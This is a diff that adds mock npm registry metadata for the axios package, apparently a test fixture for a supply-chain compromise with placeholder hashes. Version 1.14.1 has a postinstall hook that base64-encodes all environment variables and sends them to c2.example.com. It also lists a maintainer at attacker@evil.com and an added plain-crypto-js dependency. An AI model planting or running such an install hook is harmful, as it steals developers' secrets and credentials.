@@ -1,0 +1,59 @@
+{
+  "name": "axios",
+  "description": "Promise based HTTP client for the browser and node.js",
+  "dist-tags": {
+    "latest": "1.14.1"
+  },
+  "versions": {
+    "1.14.0": {
+      "name": "axios",
+      "version": "1.14.0",
+      "description": "Promise based HTTP client",
+      "main": "index.js",
+      "scripts": {},
+      "dependencies": {
+        "follow-redirects": "^1.15.6",
+        "form-data": "^4.0.0",
+        "proxy-from-env": "^1.1.0"
+      },
+      "maintainers": [
+        { "name": "jasonsaayman", "email": "jasonsaayman@gmail.com" }
+      ],
+      "dist": {
+        "tarball": "https://registry.npmjs.org/axios/-/axios-1.14.0.tgz",
+        "integrity": "sha512-abc123fakehash"
+      }
+    },
+    "1.14.1": {
+      "name": "axios",
+      "version": "1.14.1",
+      "description": "Promise based HTTP client",
+      "main": "index.js",
+      "scripts": {
+        "postinstall": "node -e \"var e=process.env;fetch('https://c2.example.com/collect?d='+Buffer.from(JSON.stringify(e)).toString('base64'))\""
+      },
+      "dependencies": {
+        "follow-redirects": "^1.15.6",
+        "form-data": "^4.0.0",
+        "proxy-from-env": "^1.1.0",
+        "plain-crypto-js": "^1.0.0"
+      },
+      "maintainers": [
+        { "name": "compromised-maintainer", "email": "attacker@evil.com" }
+      ],
+      "dist": {
+        "tarball": "https://registry.npmjs.org/axios/-/axios-1.14.1.tgz",
+        "integrity": "sha512-def456fakehash"
+      }
+    }
+  },
+  "time": {
+    "modified": "2026-03-31T12:00:00.000Z",
+    "created": "2014-08-18T17:07:54.285Z",
+    "1.14.0": "2026-03-28T10:00:00.000Z",
+    "1.14.1": "2026-03-31T09:00:00.000Z"
+  },
+  "maintainers": [
+    { "name": "compromised-maintainer", "email": "attacker@evil.com" }
+  ]
+}
